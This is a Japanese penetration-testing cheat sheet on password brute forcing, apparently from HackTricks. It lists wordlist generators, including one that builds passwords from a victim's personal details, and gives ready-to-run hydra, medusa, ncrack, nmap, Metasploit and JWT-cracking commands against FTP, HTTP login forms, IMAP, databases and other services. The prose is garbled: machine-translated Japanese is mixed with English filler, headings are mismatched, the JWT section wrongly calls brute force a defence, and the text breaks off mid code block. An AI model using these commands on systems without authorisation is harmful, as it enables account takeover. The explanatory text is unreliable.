# ブルートフォース - チートシート

<figure><img src="../.gitbook/assets/image (3) (1).png" alt=""><figcaption></figcaption></figure>

\
[**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks)を使用して、世界で最も高度なコミュニティツールによって強化された**ワークフローを簡単に構築**し、自動化します。\
今すぐアクセスを取得：

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* **サイバーセキュリティ企業で働いていますか？** **HackTricksで会社を宣伝**したいですか？または、**最新バージョンのPEASSを入手**したいですか？または、HackTricksをPDFでダウンロードしたいですか？[**サブスクリプションプラン**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を見つけてください、私たちの独占的な[**NFT**](https://opensea.io/collection/the-peass-family)のコレクションを見つけてください
* [**公式のPEASS＆HackTricks swag**](https://peass.creator-spring.com)を手に入れましょう
* [**💬**](https://emojipedia.org/speech-balloon/) [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**telegramグループ**](https://t.me/peass)に**参加**するか、**Twitter**で**フォロー**してください[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **ハッキングのトリックを共有するには、PRを提出して** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **と** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **に参加してください。**

</details>

## デフォルトの資格情報

使用されている技術のデフォルトの資格情報をGoogleで検索するか、次のリンクを試してください：

* [**https://github.com/ihebski/DefaultCreds-cheat-sheet**](https://github.com/ihebski/DefaultCreds-cheat-sheet)
* [**http://www.phenoelit.org/dpl/dpl.html**](http://www.phenoelit.org/dpl/dpl.html)
* [**http://www.vulnerabilityassessment.co.uk/passwordsC.htm**](http://www.vulnerabilityassessment.co.uk/passwordsC.htm)
* [**https://192-168-1-1ip.mobi/default-router-passwords-list/**](https://192-168-1-1ip.mobi/default-router-passwords-list/)
* [**https://datarecovery.com/rd/default-passwords/**](https://datarecovery.com/rd/default-passwords/)
* [**https://bizuns.com/default-passwords-list**](https://bizuns.com/default-passwords-list)
* [**https://github.com/danielmiessler/SecLists/blob/master/Passwords/Default-Credentials/default-passwords.csv**](https://github.com/danielmiessler/SecLists/blob/master/Passwords/Default-Credentials/default-passwords.csv)
* [**https://github.com/Dormidera/WordList-Compendium**](https://github.com/Dormidera/WordList-Compendium)
* [**https://www.cirt.net/passwords**](https://www.cirt.net/passwords)
* [**http://www.passwordsdatabase.com/**](http://www.passwordsdatabase.com)
* [**https://many-passwords.github.io/**](https://many-passwords.github.io)
* [**https://theinfocentric.com/**](https://theinfocentric.com/)
```bash
crunch 4 6 0123456789ABCDEF -o crunch1.txt #From length 4 to 6 using that alphabet
crunch 4 4 -f /usr/share/crunch/charset.lst mixalpha # Only length 4 using charset mixalpha (inside file charset.lst)

@ Lower case alpha characters
, Upper case alpha characters
% Numeric characters
^ Special characters including spac
crunch 6 8 -t ,@@^^%%
```
### Cewl

Cewl is a tool used for generating custom wordlists by scraping websites or documents. It can be helpful in performing brute force attacks by creating wordlists based on the target's specific interests or preferences.

To use Cewl, you need to provide it with a starting URL or a file containing text. It will then crawl the website or analyze the document to extract words and phrases. By applying various filters and options, you can customize the wordlist generation process to suit your needs.

Cewl can be particularly useful when targeting individuals or organizations with specific interests or when trying to crack passwords based on personal information. By creating wordlists that are tailored to the target, you increase the chances of success in a brute force attack.

To run Cewl, you can use the following command:

```
cewl [options] <URL or file>
```

Some common options include:

- `-d`: Set the depth of the crawl (default is 2).
- `-m`: Set the minimum word length (default is 3).
- `-w`: Specify the output file for the wordlist.

Cewl is a powerful tool that can enhance the effectiveness of brute force attacks by generating targeted wordlists. However, it is important to use it responsibly and ethically, ensuring that you have proper authorization before conducting any penetration testing activities.
```bash
cewl example.com -m 5 -w words.txt
```
### [CUPP](https://github.com/Mebus/cupp)

被害者の情報（名前、日付など）に基づいてパスワードを生成します。
```
python3 cupp.py -h
```
### [Wister](https://github.com/cycurity/wister)

Wisterは、単語リスト生成ツールであり、特定のターゲットに関連する使用するためのユニークで理想的な単語リストを作成するために、与えられた単語から複数のバリエーションを作成することができます。
```bash
python3 wister.py -w jane doe 2022 summer madrid 1998 -c 1 2 3 4 5 -o wordlist.lst

__          _______  _____ _______ ______ _____
\ \        / /_   _|/ ____|__   __|  ____|  __ \
\ \  /\  / /  | | | (___    | |  | |__  | |__) |
\ \/  \/ /   | |  \___ \   | |  |  __| |  _  /
\  /\  /   _| |_ ____) |  | |  | |____| | \ \
\/  \/   |_____|_____/   |_|  |______|_|  \_\

Version 1.0.3                    Cycurity

Generating wordlist...
[########################################] 100%
Generated 67885 lines.

Finished in 0.920s.
```
### [pydictor](https://github.com/LandGrey/pydictor)

### ワードリスト

* [**https://github.com/danielmiessler/SecLists**](https://github.com/danielmiessler/SecLists)
* [**https://github.com/Dormidera/WordList-Compendium**](https://github.com/Dormidera/WordList-Compendium)
* [**https://github.com/kaonashi-passwords/Kaonashi**](https://github.com/kaonashi-passwords/Kaonashi)
* [**https://github.com/google/fuzzing/tree/master/dictionaries**](https://github.com/google/fuzzing/tree/master/dictionaries)
* [**https://crackstation.net/crackstation-wordlist-password-cracking-dictionary.htm**](https://crackstation.net/crackstation-wordlist-password-cracking-dictionary.htm)
* [**https://weakpass.com/wordlist/**](https://weakpass.com/wordlist/)
* [**https://wordlists.assetnote.io/**](https://wordlists.assetnote.io/)
* [**https://github.com/fssecur3/fuzzlists**](https://github.com/fssecur3/fuzzlists)
* [**https://hashkiller.io/listmanager**](https://hashkiller.io/listmanager)
* [**https://github.com/Karanxa/Bug-Bounty-Wordlists**](https://github.com/Karanxa/Bug-Bounty-Wordlists)

<figure><img src="../.gitbook/assets/image (3) (1).png" alt=""><figcaption></figcaption></figure>

\
[**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks)を使用して、世界で最も高度なコミュニティツールによって強化された**ワークフローを簡単に構築**し、自動化します。\
今すぐアクセスを取得：

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

## サービス

サービス名でアルファベット順に並べられています。

### AFP
```bash
nmap -p 548 --script afp-brute <IP>
msf> use auxiliary/scanner/afp/afp_login
msf> set BLANK_PASSWORDS true
msf> set USER_AS_PASS true
msf> set PASS_FILE <PATH_PASSWDS>
msf> set USER_FILE <PATH_USERS>
msf> run
```
### AJP

AJP (Apache JServ Protocol) is a protocol used by Apache Tomcat to communicate with web servers. It is similar to the HTTP protocol but is more efficient for handling Java-based applications.

A common attack method against AJP is brute force, where an attacker attempts to guess the username and password combination to gain unauthorized access to the server. Brute force attacks can be automated using tools like Hydra or Burp Suite.

To protect against brute force attacks on AJP, it is important to use strong and unique passwords for all user accounts. Additionally, implementing account lockout policies can help prevent repeated login attempts. Monitoring server logs for suspicious activity and implementing rate limiting can also be effective in mitigating brute force attacks.

It is recommended to regularly update and patch the server software to address any vulnerabilities that could be exploited by attackers. Regular security audits and penetration testing can also help identify and address any weaknesses in the server's configuration.

By following these best practices, you can enhance the security of your AJP-enabled server and reduce the risk of unauthorized access.
```bash
nmap --script ajp-brute -p 8009 <IP>
```
# ブルートフォース攻撃

ブルートフォース攻撃は、暗号化されたデータやパスワードを解読するために使用される一般的な攻撃手法です。この攻撃手法では、すべての可能な組み合わせを試し、正しい組み合わせを見つけるまで繰り返します。

## ブルートフォース攻撃の手法

1. 辞書攻撃: 事前に作成された辞書を使用して、一連の単語やフレーズを試します。一般的なパスワードや一般的な単語の組み合わせを網羅しています。

2. 総当たり攻撃: すべての可能な組み合わせを順番に試します。この手法は非常に時間がかかる場合がありますが、正しい組み合わせを見つけることができます。

3. ハイブリッド攻撃: 辞書攻撃と総当たり攻撃を組み合わせた手法です。まず辞書攻撃を試し、その後総当たり攻撃を行います。

## ブルートフォース攻撃のリソース

ブルートフォース攻撃を実行するためには、以下のリソースが必要です。

1. パフォーマンスの高いハードウェア: ブルートフォース攻撃は非常に計算量が多いため、高性能なハードウェアが必要です。

2. 辞書ファイル: 辞書攻撃を行う場合は、事前に作成された辞書ファイルが必要です。一般的なパスワードや単語のリストが含まれています。

3. ブルートフォース攻撃ツール: ブルートフォース攻撃を自動化するためのツールが必要です。これにより、大量の組み合わせを効率的に試すことができます。

## ブルートフォース攻撃の対策

ブルートフォース攻撃からデータやパスワードを保護するためには、以下の対策を実施することが重要です。

1. 強力なパスワードポリシーの実施: パスワードの長さや複雑さの要件を設定し、一般的なパスワードを使用しないようにします。

2. ログイン試行回数の制限: 同じアカウントに対する連続したログイン試行回数を制限することで、ブルートフォース攻撃を防ぐことができます。

3. 二要素認証の実施: パスワードに加えて、追加の認証要素を要求することで、セキュリティを強化することができます。

4. ブルートフォース攻撃の検知と監視: ブルートフォース攻撃を検知し、異常なアクティビティを監視することで、早期に対策を講じることができます。

以上がブルートフォース攻撃に関する基本的な情報です。セキュリティを強化するために、これらの手法と対策を理解し、適切に実施することが重要です。
```bash
nmap --script cassandra-brute -p 9160 <IP>
```
# CouchDB

CouchDBは、ドキュメント指向のデータベースであり、HTTPプロトコルを使用してデータにアクセスすることができます。CouchDBは、データベースのブルートフォース攻撃に対して脆弱な場合があります。ブルートフォース攻撃は、総当たり攻撃とも呼ばれ、パスワードや認証情報を推測するために連続的に試行する攻撃手法です。

CouchDBのブルートフォース攻撃を防ぐためには、以下の方法があります。

1. 強力なパスワードポリシーを実装する：パスワードは長く、複雑で予測困難なものにする必要があります。大文字と小文字の組み合わせ、数字、特殊文字を含めることが推奨されます。

2. ログイン試行回数の制限：ログイン試行回数を制限することで、連続的なブルートフォース攻撃を防ぐことができます。一定回数の試行が失敗した場合、アカウントを一時的にロックするなどの対策を取ることが重要です。

3. IPアドレスの制限：特定のIPアドレスからのアクセスを制限することで、不正なアクセスを防ぐことができます。信頼できるIPアドレスのみがアクセスできるように設定することが重要です。

4. セキュリティパッチの適用：CouchDBの最新のセキュリティパッチを適用することで、既知の脆弱性を修正し、攻撃のリスクを軽減することができます。

これらの対策を実施することで、CouchDBのブルートフォース攻撃に対するセキュリティを向上させることができます。
```bash
msf> use auxiliary/scanner/couchdb/couchdb_login
hydra -L /usr/share/brutex/wordlists/simple-users.txt -P /usr/share/brutex/wordlists/password.lst localhost -s 5984 http-get /
```
# Docker レジストリ

Docker レジストリは、Docker イメージを保存および管理するための中央リポジトリです。Docker イメージは、アプリケーションやサービスのコンテナ化されたバージョンを表します。

Docker レジストリには、公開レジストリとプライベートレジストリの2つのタイプがあります。公開レジストリは、誰でもアクセスできる一般的なイメージのリポジトリです。一方、プライベートレジストリは、特定の組織やユーザーによって制御されるイメージのリポジトリです。

Docker レジストリへのアクセスを制限するために、認証やアクセス制御の仕組みを使用することができます。これにより、機密性の高いイメージを保護し、不正なアクセスから保護することができます。

Docker レジストリへの攻撃を防ぐために、強力なパスワードポリシーや二要素認証を使用することが重要です。また、ブルートフォース攻撃から保護するために、パスワードの複雑さを確保することも重要です。

Docker レジストリのセキュリティを向上させるためには、定期的な脆弱性スキャンやパッチ適用、ログの監視などのセキュリティ対策を実施することが推奨されます。
```
hydra -L /usr/share/brutex/wordlists/simple-users.txt  -P /usr/share/brutex/wordlists/password.lst 10.10.10.10 -s 5000 https-get /v2/
```
# Elasticsearch

Elasticsearch is a distributed, RESTful search and analytics engine built on top of Apache Lucene. It provides a scalable solution for storing, searching, and analyzing large volumes of data in real-time.

## Brute Force Attacks

Brute force attacks are a common method used by hackers to gain unauthorized access to Elasticsearch instances. In a brute force attack, the hacker systematically tries all possible combinations of usernames and passwords until the correct credentials are found.

To protect against brute force attacks, it is important to implement strong security measures, such as:

1. **Use strong passwords**: Ensure that all Elasticsearch user accounts have strong, unique passwords that are not easily guessable.

2. **Implement account lockouts**: Set up account lockouts after a certain number of failed login attempts. This can help prevent brute force attacks by temporarily locking out the attacker.

3. **Enable IP whitelisting**: Restrict access to Elasticsearch instances by allowing only trusted IP addresses to connect. This can help prevent unauthorized access from unknown sources.

4. **Monitor for suspicious activity**: Regularly monitor Elasticsearch logs for any signs of brute force attacks or unauthorized access attempts. Implementing a log monitoring system can help detect and respond to such incidents in a timely manner.

By following these security best practices, you can significantly reduce the risk of brute force attacks on your Elasticsearch instances.
```
hydra -L /usr/share/brutex/wordlists/simple-users.txt -P /usr/share/brutex/wordlists/password.lst localhost -s 9200 http-get /
```
### FTP

FTP（File Transfer Protocol）は、ファイルをサーバーとクライアント間で転送するためのプロトコルです。FTPサーバーには、ファイルのアップロードやダウンロードを行うための認証情報が必要です。一般的な攻撃手法の1つは、ブルートフォース攻撃です。

ブルートフォース攻撃は、すべての可能な組み合わせを試行し、正しい認証情報を見つけることを目指します。攻撃者は、ユーザー名とパスワードのリストを作成し、自動化ツールを使用してFTPサーバーに対して連続的にログイン試行を行います。

ブルートフォース攻撃を防ぐためには、強力なパスワードポリシーを採用し、ユーザーが簡単に推測できない複雑なパスワードを使用することが重要です。また、ログイン試行回数の制限やアカウントロックアウトの機能を実装することも有効です。

FTPサーバーのセキュリティを向上させるためには、暗号化された通信（FTPSやSFTP）を使用することや、アクセス制御リスト（ACL）を設定することも推奨されます。さらに、定期的なパッチ適用やログの監視などのセキュリティ対策も重要です。
```bash
hydra -l root -P passwords.txt [-t 32] <IP> ftp
ncrack -p 21 --user root -P passwords.txt <IP> [-T 5]
medusa -u root -P 500-worst-passwords.txt -h <IP> -M ftp
```
### HTTPジェネリックブルート

#### [**WFuzz**](../pentesting-web/web-tool-wfuzz.md)

### HTTPベーシック認証
```bash
hydra -L /usr/share/brutex/wordlists/simple-users.txt -P /usr/share/brutex/wordlists/password.lst sizzle.htb.local http-get /certsrv/
# Use https-get mode for https
medusa -h <IP> -u <username> -P  <passwords.txt> -M  http -m DIR:/path/to/auth -T 10
```
### HTTP - ポストフォーム

Brute forcing a login form is a common technique used to gain unauthorized access to a web application. In this method, an attacker systematically tries different combinations of usernames and passwords until a successful login is achieved.

ポストフォームのブルートフォース攻撃は、ウェブアプリケーションへの不正アクセスを試みるためによく使われる手法です。この方法では、攻撃者はユーザー名とパスワードの異なる組み合わせをシステム的に試し、成功するログインを狙います。

To perform a brute force attack on a login form, the attacker needs to send multiple HTTP POST requests with different username and password combinations. The attacker can automate this process using tools like Hydra or Burp Suite.

ログインフォームへのブルートフォース攻撃を実行するには、攻撃者は異なるユーザー名とパスワードの組み合わせで複数のHTTP POSTリクエストを送信する必要があります。攻撃者は、HydraやBurp Suiteなどのツールを使用してこのプロセスを自動化することができます。

It is important to note that brute forcing a login form is a time-consuming process and may trigger account lockouts or other security measures. Therefore, it is recommended to use this technique responsibly and with proper authorization.

ログインフォームのブルートフォース攻撃は時間がかかるプロセスであり、アカウントのロックアウトや他のセキュリティ対策を引き起こす可能性があることに注意してください。したがって、この技術を責任を持って適切な認可を得て使用することをお勧めします。
```bash
hydra -L /usr/share/brutex/wordlists/simple-users.txt -P /usr/share/brutex/wordlists/password.lst domain.htb  http-post-form "/path/index.php:name=^USER^&password=^PASS^&enter=Sign+in:Login name or password is incorrect" -V
# Use https-post-form mode for https
```
http**s**の場合は、「http-post-form」を「**https-post-form」に変更する必要があります。

### **HTTP - CMS --** (W)ordpress, (J)oomla or (D)rupal or (M)oodle
```bash
cmsmap -f W/J/D/M -u a -p a https://wordpress.com
```
IMAP (Internet Message Access Protocol) is a widely used protocol for email retrieval. It allows users to access their email messages on a remote mail server. IMAP supports both online and offline modes, allowing users to manage their email messages even when they are not connected to the server.

#### Brute-Forcing IMAP Credentials

Brute-forcing is a common technique used to gain unauthorized access to IMAP accounts. It involves systematically trying all possible combinations of usernames and passwords until the correct credentials are found.

To perform a brute-force attack on an IMAP server, you can use tools like Hydra or Medusa. These tools automate the process of trying different username and password combinations, making it easier to find the correct credentials.

Before launching a brute-force attack, it is important to gather information about the target, such as the email address format and any known usernames. This information can help narrow down the list of possible usernames to try.

It is also important to use a good wordlist for the password guessing phase. A wordlist is a file containing a list of commonly used passwords, dictionary words, and other possible combinations. Tools like Crunch or Cewl can be used to generate custom wordlists based on specific criteria.

To increase the chances of success, it is recommended to use a combination of different attack vectors, such as a dictionary attack, a hybrid attack, or a mask attack. These attack vectors can help optimize the brute-forcing process by focusing on the most likely password combinations first.

However, it is important to note that brute-forcing is a time-consuming process and may not always be successful. Many email providers have implemented security measures to detect and block brute-force attacks, such as account lockouts or CAPTCHA challenges.

Therefore, it is crucial to use brute-forcing techniques responsibly and only on systems that you have permission to test. Unauthorized access to someone else's email account is illegal and unethical. Always obtain proper authorization before conducting any penetration testing activities.
```bash
hydra -l USERNAME -P /path/to/passwords.txt -f <IP> imap -V
hydra -S -v -l USERNAME -P /path/to/passwords.txt -s 993 -f <IP> imap -V
nmap -sV --script imap-brute -p <PORT> <IP>
```
IRC（Internet Relay Chat）は、インターネット上でリアルタイムのテキストベースのコミュニケーションを可能にするプロトコルです。IRCは、チャットルームと呼ばれるグループチャットの形式を提供し、ユーザーはテキストメッセージを送信し、他のユーザーと対話することができます。

IRCサーバーに対するブルートフォース攻撃は、ユーザー名とパスワードの組み合わせを総当たりで試行し、正しい認証情報を見つけることを試みる攻撃手法です。この攻撃は、弱いパスワードを使用しているユーザーを特定し、不正アクセスを試みるために使用されます。

ブルートフォース攻撃は、自動化されたツールを使用して実行することができます。これらのツールは、辞書攻撃や総当たり攻撃などの異なる攻撃手法を使用して、大量のユーザー名とパスワードの組み合わせを試行します。

ブルートフォース攻撃は、セキュリティ上の脆弱性を悪用するため、対象のシステムやアカウントのセキュリティを強化するための対策が重要です。これには、強力なパスワードポリシーの実施、アカウントロックアウトの設定、二要素認証の導入などが含まれます。

ブルートフォース攻撃は、合法的なセキュリティテストやペネトレーションテストの一環として使用されることもありますが、許可なく他人のアカウントにアクセスしようとする場合は違法行為となります。
```bash
nmap -sV --script irc-brute,irc-sasl-brute --script-args userdb=/path/users.txt,passdb=/path/pass.txt -p <PORT> <IP>
```
### ISCSI

iSCSI (Internet Small Computer System Interface) is a protocol that allows the transmission of SCSI commands over IP networks. It enables the use of storage devices over a network, making it possible to access remote storage resources as if they were local.

iSCSI works by encapsulating SCSI commands into IP packets, which are then transmitted over TCP/IP networks. This allows for the remote mounting of storage devices, such as disks or tape drives, on a client system.

One of the advantages of iSCSI is its flexibility and compatibility with existing infrastructure. It can be used with both Ethernet and Fibre Channel networks, and can leverage existing IP-based networks. This makes it a cost-effective solution for organizations that want to extend their storage capabilities without investing in additional hardware.

However, the use of iSCSI also introduces security risks. Since iSCSI traffic is transmitted over IP networks, it is susceptible to interception and unauthorized access. To mitigate these risks, it is important to implement security measures such as authentication, encryption, and access control.

Overall, iSCSI is a powerful protocol that enables the efficient and flexible use of storage resources over a network. By understanding its capabilities and implementing appropriate security measures, organizations can leverage iSCSI to enhance their storage infrastructure.
```bash
nmap -sV --script iscsi-brute --script-args userdb=/var/usernames.txt,passdb=/var/passwords.txt -p 3260 <IP>
```
JWT（JSON Web Token）は、認証と情報の安全な伝送を可能にするための開放的な標準です。JWTは、JSON形式で情報をエンコードし、署名または暗号化してトークンとして使用します。JWTは、ユーザーの認証情報やクレーム（権限、ロールなど）を含むことができます。JWTは、クライアントとサーバー間での信頼性のある通信を確保するために使用されます。

JWTの攻撃に対する防御策として、ブルートフォース攻撃があります。ブルートフォース攻撃は、すべての可能な組み合わせを試行し、正しいトークンを見つけることを試みる攻撃です。この攻撃を防ぐためには、強力なパスワードポリシーを実装し、パスワードの複雑さを確保する必要があります。また、アカウントロックアウトやCAPTCHAなどのセキュリティメカニズムを導入することも有効です。

ブルートフォース攻撃を防ぐための他の方法として、トークンの有効期限を短くすることや、認証試行回数の制限を設けることも考えられます。さらに、IPアドレスの制限や二要素認証の導入も有効な対策です。

JWTのセキュリティを確保するためには、適切な暗号化アルゴリズムを使用し、署名キーを厳密に管理する必要があります。また、トークンの送信時にはHTTPSを使用することも重要です。

以上が、JWTに関する情報とブルートフォース攻撃に対する防御策です。
```bash
#hashcat
hashcat -m 16500 -a 0 jwt.txt .\wordlists\rockyou.txt

#https://github.com/Sjord/jwtcrack
python crackjwt.py eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJkYXRhIjoie1widXNlcm5hbWVcIjpcImFkbWluXCIsXCJyb2xlXCI6XCJhZG1pblwifSJ9.8R-KVuXe66y_DXVOVgrEqZEoadjBnpZMNbLGhM8YdAc /usr/share/wordlists/rockyou.txt

#John
john jwt.txt --wordlist=wordlists.txt --format=HMAC-SHA256

#https://github.com/ticarpi/jwt_tool
python3 jwt_tool.py -d wordlists.txt <JWT token>

#https://github.com/brendan-rius/c-jwt-cracker
./jwtcrack eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJkYXRhIjoie1widXNlcm5hbWVcIjpcImFkbWluXCIsXCJyb2xlXCI6XCJhZG1pblwifSJ9.8R-KVuXe66y_DXVOVgrEqZEoadjBnpZMNbLGhM8YdAc 1234567890 8

#https://github.com/mazen160/jwt-pwn
python3 jwt-cracker.py -jwt eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJkYXRhIjoie1widXNlcm5hbWVcIjpcImFkbWluXCIsXCJyb2xlXCI6XCJhZG1pblwifSJ9.8R-KVuXe66y_DXVOVgrEqZEoadjBnpZMNbLGhM8YdAc -w wordlist.txt

#https://github.com/lmammino/jwt-cracker
jwt-cracker "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiYWRtaW4iOnRydWV9.TJVA95OrM7E2cBab30RMHrHDcEfxjoYZgeFONFh7HgQ" "abcdefghijklmnopqrstuwxyz" 6
```
## LDAP

LDAP（Lightweight Directory Access Protocol）は、ディレクトリサービスにアクセスするためのプロトコルです。ディレクトリサービスは、ユーザー、グループ、コンピュータなどの情報を格納するために使用されます。LDAPは、ディレクトリサービスに対して検索、追加、変更、削除などの操作を行うための方法を提供します。

LDAPブルートフォース攻撃は、LDAPサーバーに対して総当たり攻撃を行う手法です。攻撃者は、ユーザー名とパスワードの組み合わせを試し、正しい認証情報を見つけることを目指します。この攻撃は、弱いパスワードを使用しているユーザーアカウントを特定するために使用されます。

LDAPブルートフォース攻撃は、一般的に辞書攻撃と組み合わせて使用されます。辞書攻撃では、一連の一般的なパスワードを試すことで、攻撃者は成功する可能性を高めます。攻撃者は、LDAPサーバーに対して多数のリクエストを送信し、正しい認証情報を見つけるまで続けます。

LDAPブルートフォース攻撃を防ぐためには、強力なパスワードポリシーを実装し、パスワードの複雑さを強化する必要があります。また、アカウントロックアウトポリシーを設定することも重要です。これにより、一定回数の認証失敗後にアカウントがロックアウトされ、攻撃者の総当たり攻撃を防ぐことができます。

LDAPブルートフォース攻撃は、セキュリティテストやペネトレーションテストの一環として使用されることがあります。これにより、組織は自身のLDAPサーバーの脆弱性を特定し、適切な対策を講じることができます。
```bash
nmap --script ldap-brute -p 389 <IP>
```
### MQTT

MQTT（Message Queuing Telemetry Transport）は、軽量なメッセージングプロトコルであり、IoT（Internet of Things）デバイス間の通信に広く使用されています。このプロトコルは、低帯域幅や不安定なネットワーク環境でも効率的に動作します。

MQTTは、パブリッシャーとサブスクライバーの2つの役割を持つクライアント間の非同期通信を可能にします。パブリッシャーはメッセージをトピックにパブリッシュし、サブスクライバーは特定のトピックに対してサブスクライブしてメッセージを受信します。

MQTTのセキュリティには注意が必要です。デフォルトの設定では、認証や暗号化が行われず、メッセージが盗聴や改ざんのリスクにさらされます。したがって、セキュリティを強化するためには、認証やTLS（Transport Layer Security）などのセキュリティ機能を適切に設定する必要があります。

MQTTのブルートフォース攻撃は、パスワードの推測や辞書攻撃を使用して、認証情報を解読しようとするものです。この攻撃を防ぐためには、強力なパスワードポリシーを実装し、認証情報の漏洩を防止する必要があります。

また、MQTTブローカーのセキュリティ設定を適切に構成することも重要です。不正なアクセスを防ぐために、アクセス制御リスト（ACL）を使用して、許可されたクライアントのみがブローカーに接続できるようにすることが推奨されます。

MQTTのセキュリティに関する最新のベストプラクティスや脆弱性については、MQTTプロトコルのドキュメントやセキュリティガイドラインを参照することをおすすめします。
```
ncrack mqtt://127.0.0.1 --user test –P /root/Desktop/pass.txt -v
```
# ブルートフォース攻撃

ブルートフォース攻撃は、Mongoデータベースに対して非常に効果的な攻撃手法です。この攻撃手法では、すべての可能なパスワードの組み合わせを試し、正しいパスワードを見つけることを目指します。

以下は、Mongoデータベースに対するブルートフォース攻撃の手順です。

1. ユーザー名のリストを取得します。
2. パスワードのリストを取得します。
3. ユーザー名とパスワードの組み合わせを作成します。
4. 作成した組み合わせを使用してMongoデータベースにログインを試みます。
5. 正しい組み合わせが見つかるまで、ステップ4を繰り返します。

ブルートフォース攻撃は非常に時間がかかる場合がありますが、強力なパスワードを使用している場合には成功する可能性が低くなります。したがって、セキュリティを強化するためには、強力なパスワードポリシーを採用することが重要です。

また、ブルートフォース攻撃を防ぐためには、以下の対策を講じることが推奨されます。

- パスワードの長さと複雑さを増す
- ログイン試行回数の制限を設定する
- 2要素認証を使用する

以上がMongoデータベースに対するブルートフォース攻撃の概要です。セキュリティを強化するためには、適切な対策を講じることが重要です。
```bash
nmap -sV --script mongodb-brute -n -p 27017 <IP>
use auxiliary/scanner/mongodb/mongodb_login
```
### MySQL

MySQLは、オープンソースのリレーショナルデータベース管理システムであり、多くのウェブアプリケーションやウェブサイトで使用されています。MySQLデータベースへの不正アクセスを試みる際に、ブルートフォース攻撃は一般的な手法の1つです。

ブルートフォース攻撃は、総当たり攻撃とも呼ばれ、パスワードを推測するために連続的に試行する手法です。攻撃者は、一連のパスワードを自動的に生成し、それらを順番に試して、正しいパスワードを見つけることを目指します。

MySQLのブルートフォース攻撃では、一般的にユーザー名とパスワードの組み合わせを試行します。攻撃者は、一般的なユーザー名やパスワード、辞書攻撃、またはランダムな文字列を使用して攻撃を行います。

ブルートフォース攻撃を防ぐためには、強力なパスワードポリシーを実装し、パスワードの複雑さを確保することが重要です。また、アカウントロックアウト機能やIP制限などのセキュリティメカニズムを使用することも有効です。

MySQLのブルートフォース攻撃を検出するためには、ログイン試行の異常な増加や特定のユーザー名/パスワードの連続試行などのパターンを監視することが重要です。また、侵入検知システムやログ監視ツールを使用することも推奨されます。

ブルートフォース攻撃は、時間とリソースがかかるため、強力なパスワードやセキュリティ対策があれば、成功する可能性は低くなります。したがって、MySQLデータベースのセキュリティを確保するためには、適切な対策を講じることが重要です。
```bash
# hydra
hydra -L usernames.txt -P pass.txt <IP> mysql

# msfconsole
msf> use auxiliary/scanner/mysql/mysql_login; set VERBOSE false

# medusa
medusa -h <IP/Host> -u <username> -P <password_list> <-f | to stop medusa on first success attempt> -t <threads> -M mysql
```
# Brute Force

Brute force is a common method used in penetration testing to crack passwords or encryption keys by systematically trying all possible combinations until the correct one is found. This technique can be applied to various systems, including Oracle SQL databases.

## Brute Forcing Oracle SQL

When it comes to Oracle SQL, there are several tools and techniques that can be used for brute forcing. Here are some commonly used methods:

1. **Dictionary Attack**: This method involves using a pre-generated list of commonly used passwords or words from a dictionary to attempt to gain unauthorized access. Tools like Hydra or Medusa can be used to automate this process.

2. **Password Guessing**: In this method, the attacker manually tries different passwords based on their knowledge of the target, such as personal information or common patterns. This can be a time-consuming process but can be effective if the attacker has some insight into the target's password habits.

3. **Rainbow Tables**: Rainbow tables are precomputed tables that contain a large number of possible password hashes and their corresponding plaintext values. By comparing the hash of the target password with the entries in the rainbow table, the attacker can quickly find a match. Tools like Ophcrack or RainbowCrack can be used for this purpose.

4. **Brute Forcing Tools**: There are specialized tools available that can automate the brute forcing process for Oracle SQL databases. These tools, such as SQLBrute or OraBrute, use various techniques like parallel processing and optimized algorithms to speed up the cracking process.

## Mitigating Brute Force Attacks

To protect against brute force attacks on Oracle SQL databases, it is important to implement strong security measures. Here are some recommended practices:

1. **Use Strong Passwords**: Encourage users to choose complex passwords that are difficult to guess. This includes a combination of uppercase and lowercase letters, numbers, and special characters.

2. **Account Lockouts**: Implement account lockout policies that temporarily lock user accounts after a certain number of failed login attempts. This can help prevent brute force attacks by slowing down the attacker's progress.

3. **Two-Factor Authentication**: Enable two-factor authentication for Oracle SQL accounts to add an extra layer of security. This requires users to provide a second form of verification, such as a code sent to their mobile device, in addition to their password.

4. **Monitoring and Logging**: Regularly monitor and review logs for any suspicious activity, such as multiple failed login attempts from the same IP address. This can help detect and respond to brute force attacks in a timely manner.

By implementing these security measures, you can significantly reduce the risk of successful brute force attacks on your Oracle SQL databases.
```bash
patator oracle_login sid=<SID> host=<IP> user=FILE0 password=FILE1 0=users-oracle.txt 1=pass-oracle.txt -x ignore:code=ORA-01017

./odat.py passwordguesser -s $SERVER -d $SID
./odat.py passwordguesser -s $MYSERVER -p $PORT --accounts-file accounts_multiple.txt

#msf1
msf> use admin/oracle/oracle_login
msf> set RHOSTS <IP>
msf> set RPORT 1521
msf> set SID <SID>

#msf2, this option uses nmap and it fails sometimes for some reason
msf> use scanner/oracle/oracle_login
msf> set RHOSTS <IP>
msf> set RPORTS 1521
